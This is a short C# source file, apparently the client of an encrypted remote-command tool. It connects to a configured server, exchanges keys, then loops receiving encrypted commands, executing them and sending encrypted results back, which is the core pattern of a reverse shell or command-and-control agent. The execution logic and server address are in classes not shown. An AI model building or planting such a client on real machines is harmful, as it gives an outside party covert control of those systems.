using Client_side;
using System.Net.Sockets;

public class Program
{
    public static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    public static void Main()
    {
        // Connect to the server and send the public key
        NetworkLayer.Connect(Utils.IP, Utils.PORT);
        NetworkLayer.SendPublicKey();
        string passPhrase = NetworkLayer.ReceivePassPhrase();
        Console.WriteLine("Passphrase: " + passPhrase);
        Encryptor encryptor = new(passPhrase.Trim());

        // Loop to receive commands from the server and execute them then send the result back
        while (true)
        {
            byte[] command = NetworkLayer.ReceiveCommand();
            Console.WriteLine(Encryptor.ConvertStr(command));
            string decryptedCommand = encryptor.Decrypt(command);
            string result = HandleCommand.ProcessCommand(decryptedCommand);
            byte[] encryptedResult = encryptor.Encrypt(result);
            Console.WriteLine(Encryptor.ConvertStr(encryptedResult));
            NetworkLayer.SendResult(encryptedResult);
        }
    }
}